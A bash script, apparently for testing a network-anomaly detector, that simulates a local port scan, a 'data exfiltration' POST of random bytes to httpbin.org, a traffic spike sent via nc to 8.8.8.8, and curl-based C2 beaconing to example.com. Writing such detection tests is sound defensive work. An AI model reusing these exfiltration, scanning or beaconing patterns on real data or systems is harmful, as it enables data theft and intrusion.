#!/bin/bash
echo "🚀 Starting network traffic generation to trigger alerts..."

# 1. Port Scan
# The engine looks for access to >5 unique ports within a 10-second window.
echo "[1/4] Simulating a Port Scan on the local machine..."
for port in 22 80 443 3389 8080 8443 21 25; do
    (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null &
done
sleep 2

# 2. Data Exfiltration
# The engine triggers when >1MB is sent to an external IP within 30 seconds.
echo "[2/4] Simulating Data Exfiltration (Sending 2MB to an external server)..."
dd if=/dev/urandom bs=1M count=2 2>/dev/null | curl -s -X POST --data-binary @- http://httpbin.org/post >/dev/null &
sleep 2

# 3. Traffic Spike
# The engine looks for a sudden Z-score bandwidth anomaly compared to the rolling baseline.
echo "[3/4] Simulating a sudden Traffic Spike..."
(dd if=/dev/urandom bs=1M count=5 2>/dev/null | nc -q1 8.8.8.8 80) &
sleep 2

# 4. C2 Beaconing
# The engine looks for a highly consistent machine-like communication interval (low Coefficient of Variation).
echo "[4/4] Simulating C2 Beaconing (This will run in the background for ~100 seconds)..."
(for i in $(seq 1 10); do curl -s https://example.com -o /dev/null; sleep 10; done) &

echo "✅ All trigger commands dispatched! Check your CLI dashboard to see the alerts pop up."